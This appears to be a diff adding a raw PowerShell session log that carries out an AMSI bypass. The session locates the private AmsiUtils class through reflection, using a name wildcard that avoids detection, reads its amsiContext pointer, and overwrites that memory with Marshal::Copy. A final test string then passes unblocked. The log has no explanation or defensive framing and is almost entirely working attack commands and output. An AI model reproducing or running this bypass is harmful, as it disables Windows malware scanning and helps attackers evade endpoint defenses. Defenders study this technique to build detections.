@@ -1,0 +1,143 @@
+PS C:\Users\test>  $a=[Ref].Assembly.GetTypes()
+PS C:\Users\test>
+PS C:\Users\test> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}
+
+IsPublic IsSerial Name                                     BaseType
+-------- -------- ----                                     --------
+False    False    AmsiUtils                                System.Object
+
+
+PS C:\Users\test> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+PS C:\Users\test> $c.GetFields('NonPublic,Static')
+
+
+Name                   : amsiContext
+MetadataToken          : 67114382
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.IntPtr
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiSession
+MetadataToken          : 67114383
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.IntPtr
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiInitFailed
+MetadataToken          : 67114384
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.Boolean
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiLockObject
+MetadataToken          : 67114385
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.Object
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+
+
+PS C:\Users\test>
+PS C:\Users\test>       : amsiContext
+: : The term ':' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
+spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:7
++       : amsiContext
++       ~
+    + CategoryInfo          : ObjectNotFound: (::String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\test> $d=$c.GetFields('NonPublic,Static')
+PS C:\Users\test> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+PS C:\Users\test> $f.GetValue($null)
+3039220790496
+PS C:\Users\test> $a=[Ref].Assembly.GetTypes()
+PS C:\Users\test> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+PS C:\Users\test> $d=$c.GetFields('NonPublic,Static')
+PS C:\Users\test> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+PS C:\Users\test> $g=$f.GetValue($null)
+PS C:\Users\test> [IntPtr]$ptr=$g
+PS C:\Users\test> [Int32[]]$buf=@(0)
+PS C:\Users\test> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+PS C:\Users\test> 'amsiutils'
+amsiutils
